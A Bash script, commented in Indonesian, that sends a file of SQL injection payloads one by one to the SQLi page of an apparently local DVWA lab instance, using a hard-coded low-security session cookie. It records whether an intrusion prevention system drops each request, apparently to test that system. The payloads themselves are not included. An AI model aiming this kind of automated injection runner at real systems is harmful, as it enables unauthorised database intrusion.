#!/bin/bash

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

LOG_DIR="$SCRIPT_DIR/saved_logs/attacker"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/log-nomor 1_send_attack.txt"
exec > >(tee -a "$LOG_FILE") 2>&1
echo "[LOG] Logging dimulai: $(date '+%Y-%m-%d %H:%M:%S')"
echo "[LOG] File log: $LOG_FILE"

ATTACK_FILE="$PROJECT_DIR/sqli_payloads.txt"
TARGET_IP="172.17.0.2"
TARGET_URL="http://$TARGET_IP/vulnerabilities/sqli/"
COOKIE="PHPSESSID=pgdrle5m5kd2rdvs9rbp8u6il6; security=low"
DELAY=0.5   # detik antar request (ubah ke 0 untuk kecepatan penuh)

if [ -n "$1" ]; then
    COOKIE="$1"
fi

TOTAL=$(grep -cv '^\s*$\|^#' "$ATTACK_FILE" 2>/dev/null || echo 0)

echo ""
echo "========================================================"
echo "  NODE ATTACKER: SEND ATTACK (SQLi Payloads)"
echo "========================================================"
echo "  Target  : $TARGET_URL"
echo "  File    : $ATTACK_FILE"
echo "  Payloads: $TOTAL"
echo "  Cookie  : ${COOKIE:0:40}..."
echo "========================================================"
echo ""
echo "  Format output:"
echo "  -> Menampilkan payload yang dikirim"
echo "  -> HTTP Status Code respons dari server"
echo "  (Status 000/timeout = paket di-DROP oleh IPS)"
echo ""
echo "========================================================"

COUNT=0
BLOCKED=0
ALLOWED=0

while IFS= read -r payload; do
    [[ -z "$payload" || "$payload" == \#* ]] && continue

    COUNT=$((COUNT + 1))

    HTTP_STATUS=$(curl -s -o /dev/null --max-time 2 \
        -w "%{http_code}" \
        -G "$TARGET_URL" \
        --data-urlencode "id=$payload" \
        --data-urlencode "Submit=Submit" \
        -H "Cookie: $COOKIE")

    if [ "$HTTP_STATUS" = "000" ]; then
        LABEL="[DROP] BLOCKED/DROPPED (timeout)"
        BLOCKED=$((BLOCKED + 1))
    elif [ "$HTTP_STATUS" = "200" ]; then
        LABEL="[PASS] LOLOS -> HTTP $HTTP_STATUS"
        ALLOWED=$((ALLOWED + 1))
    else
        LABEL="[WARN] HTTP $HTTP_STATUS"
        ALLOWED=$((ALLOWED + 1))
    fi

    printf "[%3d/%d] %-60s %s\n" "$COUNT" "$TOTAL" "${payload:0:60}" "$LABEL"

    sleep "$DELAY"
done < "$ATTACK_FILE"

echo ""
echo "--------------------------------------------------------"
echo "  RINGKASAN SERANGAN:"
echo "  Total Payload Dikirim : $COUNT"
echo "  Diblokir (DROP/timeout): $BLOCKED"
echo "  Lolos ke server       : $ALLOWED"
echo "--------------------------------------------------------"
echo ""
